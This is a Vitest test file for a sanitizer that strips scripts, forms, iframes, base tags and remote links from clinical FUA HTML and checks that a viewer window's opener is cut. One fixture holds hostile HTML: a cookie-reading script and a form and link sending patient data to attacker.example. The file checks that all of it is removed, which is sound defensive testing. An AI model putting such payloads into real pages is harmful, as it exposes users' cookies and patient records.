import { describe, expect, it, vi } from 'vitest';

import { loadSafeFuaHtmlInWindow, prepareSafeFuaHtml } from './safe-fua-html';

describe('prepareSafeFuaHtml', () => {
  it('keeps static clinical content and embedded images', () => {
    const result = prepareSafeFuaHtml(
      '<html><body><h1>FUA 123</h1><img src="data:image/png;base64,AAAA" alt="firma"></body></html>',
    );

    expect(result).toContain('FUA 123');
    expect(result).toContain('data:image/png;base64,AAAA');
    expect(result).toContain('Content-Security-Policy');
    expect(result).toContain("default-src 'none'");
  });

  it('removes executable, interactive and remote content', () => {
    const result = prepareSafeFuaHtml(`
      <html>
        <head><base href="https://attacker.example/"><script>alert(document.cookie)</script></head>
        <body onload="alert(1)">
          <a href="https://attacker.example/leak">send data</a>
          <form action="https://attacker.example/leak"><input name="patient"></form>
          <iframe src="https://attacker.example/"></iframe>
          <img src="https://attacker.example/pixel">
        </body>
      </html>
    `);

    expect(result).not.toMatch(/<script|<form|<iframe|<base/i);
    expect(result).not.toMatch(/onload=|href=|action=|attacker\.example/i);
  });
});

describe('loadSafeFuaHtmlInWindow', () => {
  it('severs the opener before navigating to the sanitized document', () => {
    const replace = vi.fn();
    const addEventListener = vi.fn();
    const targetWindow = {
      opener: window,
      addEventListener,
      location: { replace },
    } as unknown as Window;
    const createObjectURL = vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:safe-fua');

    loadSafeFuaHtmlInWindow(targetWindow, '<h1>FUA</h1>');

    expect(targetWindow.opener).toBeNull();
    expect(replace).toHaveBeenCalledWith('blob:safe-fua');
    expect(addEventListener).toHaveBeenCalledWith('load', expect.any(Function), { once: true });
    createObjectURL.mockRestore();
  });
});
